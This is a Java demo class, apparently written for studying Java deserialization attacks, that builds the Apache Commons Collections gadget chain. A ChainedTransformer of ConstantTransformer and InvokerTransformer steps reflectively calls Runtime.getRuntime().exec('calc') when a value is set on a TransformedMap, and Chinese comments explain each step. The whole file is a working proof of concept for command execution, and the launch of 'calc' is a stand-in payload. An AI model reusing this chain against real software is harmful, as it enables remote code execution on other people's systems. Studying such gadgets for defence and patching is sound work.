package com.xiwei.demo;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.util.HashMap;
import java.util.Map;

public class TestTransformedMap {
    public static void main(String[] args) {
        Transformer[] transformer = new Transformer[]{
                // ConstantTransformer.transform返回 java.lang.Runtime
                new ConstantTransformer(Runtime.class),
                // InvokerTransformer反射getClass获取到传入到runtime 会变成 java.lang.class 利用 java.lang.class 中的 getMethod 获取getRuntime
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},
                        new Object[]{"getRuntime",new Class[0]}),   // 返回的是getRuntime的方法
                // 上面返回的应该是getRuntime的这个静态方法 获取反射类中的invoke类执行getRuntime
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
                // 调用返回实例中的exec
                new InvokerTransformer("exec", new Class[]{String.class},new Object[]{"calc"})
        };
        ChainedTransformer run = new ChainedTransformer(transformer);
        HashMap map1 = new HashMap();
        HashMap map2 = new HashMap();
        Map decorate = TransformedMap.decorate(map1, null, run);
        decorate.put("1", "2");
//        map2.put(1,1);
//        decorate.putAll(map2);
        Map.Entry next = (Map.Entry) decorate.entrySet().iterator().next();
        next.setValue("fp");
    }
}
